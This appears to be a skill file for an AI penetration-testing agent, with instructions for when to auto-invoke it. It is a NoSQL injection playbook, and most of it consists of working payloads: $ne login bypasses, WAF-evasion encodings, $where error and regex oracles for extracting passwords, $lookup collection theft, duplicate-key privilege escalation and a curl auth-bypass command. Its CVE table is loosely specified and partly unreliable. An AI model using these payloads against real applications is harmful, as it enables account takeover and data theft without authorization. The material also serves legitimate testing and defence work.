---
name: nosqli
description: >-
  NoSQL injection — MongoDB/ES/Redis-style operator objects, $where JS execution,
  regex oracles, aggregation theft, hard-filter bypass. Auto-invoke when: JSON bodies
  or URL array params accept `$ne`/`$gt`/`$regex`/`$where`/`$exists`, filter keys carry
  `__gt`/`_regex` ORM lookups, MongoDB/Elasticsearch tech fingerprint. Do NOT load for:
  classic SQL error strings → use `sqli`.
family: differential
severity: medium → critical
---

# NoSQL Injection — operator · syntax · regex oracle · aggregation

> **Arsenal:** log in as anyone, read every document, run JS (`$where` → `child_process`
> RCE on Node/old Mongo), steal related collections via `$lookup`.
> **Sibling:** `sqli` (SQL dialects); ORM kwargs on relational DBs still → `nosqli` when
> `__gt`-style lookup suffixes are accepted.
> **Proof bar:** operator changes results vs literal (extra rows / cross-account), tautology
> vs false differential, exception text carrying document fields, or command output in-band.
> **Setup:** none — send JSON; the app must JSON.parse your body (content-type must match).

## WAF Bypass (NoSQL)
- WAF rules rarely model `{"$ne":…}` — encode as arrays: `username[$ne]=x&password[$ne]=x` (PHP-style)
- Split keys: `{"$n"+"e":null}` won't parse — instead use duplicate keys `{"a":1,"a":{"$ne":1}}`
- Case variants `$NE`, pathological nesting `{"$ne": {"$ne": null}}`, `{"$gt":""}` unicode bounds
- Send as `application/json` vs `application/x-www-form-urlencoded` — the parser differs

## Context
- Sink exists when the app builds Mongo/ES queries from raw request JSON or `param[key]=value`
  arrays instead of a query-builder. Login forms, filters, search, analytics — all candidates.
- The literal-vs-operator differential is the proof: `{"$ne":null}` returning rows the literal
  can't means the operator is executed server-side.

## General Techniques
- **Auth bypass:** `{"username":{"$ne":null},"password":{"$ne":null}}` → any account
- **Operator escalation:** `$gt:"z"` (high sort), `$regex:".*"`, `$exists:true`, `$nin:[]`
- **Syntax oracle:** `$where:this.password.match(/^.*$/)` true vs `1==2` false — differential
- **Error oracle:** `$where:throw Error(JSON.stringify(this.password))` → field in exception text
- **Regex oracle:** `{"field":{"$regex":"^a"}}` match vs no-match → char-by-char extraction
- **Aggregation theft:** `$lookup` with attacker-chosen `from`/`localField` → foreign-collection fields in rows
- **Duplicate-key JSON:** `{"u":"a","role":"user","role":"admin"}` last-wins assembly holes → privesc
- **ORM lookup suffixes:** `field__gt`, `field__regex`, `_regex` in filter keys → relationship loop-back
- **Hard-filter bypass:** `users` filter spreading into related-model lookups → rows `is_secret=False` excludes, rendered
- **Array-param injection (PHP):** `?username[$ne]=x` — PHP converts to nested arrays fed to Mongo

## Second-Order & Bypass Techniques
- Inject operator into a stored doc (profile field, comment) → rendered in admin filter views
- `$where` payload stored in a field the admin search later uses — trigger at second sink

## Auth Bypass Techniques
- `{"password":{"$ne":null}}` / `{"password":{"$regex":".*"}}` — skip password check
- `$where:this.role=='admin'` as an inline login gate in old Mongo

## Header Techniques
- Accept-Language / User-Agent stored and filtered later with regex lookups — same operator battery
- `X-Forwarded-For` parsed into geo-filter queries

## CVE on Sight
| CVE | Surface | Class |
|---|---|---|
| CVE-2013-1892 | MongoDB < 2.4.4 | $where JS RCE |
| CVE-2021-20321 / 20322 | MongoDB 4.x/5.x | $where/$function injection (generic) |
| Log4Shell-adjacent | Elasticsearch 6.x | MVEL/script injection (es 6.x) |

## Indicators — record as `possible` when seen
- JSON body fields that echo your key names back (`{"$ne":"x"}` → same object in response)
- Login form accepting `email[$ne]=a@b.c` style params with behavior change
- 500 with JS/`MongoError`/`E11000` text when operators sent; tech banners: mongo, elasticsearch
- Filter dialogs with "advanced" operator dropdowns on API-driven tables

## Tools
- `curl -s -X POST -H 'Content-Type: application/json' -d '{"user":{"$ne":null},"pass":{"$ne":null}}' URL/login`
- mongo shell (`mongosh --eval`) only against YOUR OWN test DBs for payload shaping
- Burp Intruder + `{"$regex":"^<prefix>"}` char-by-char when blind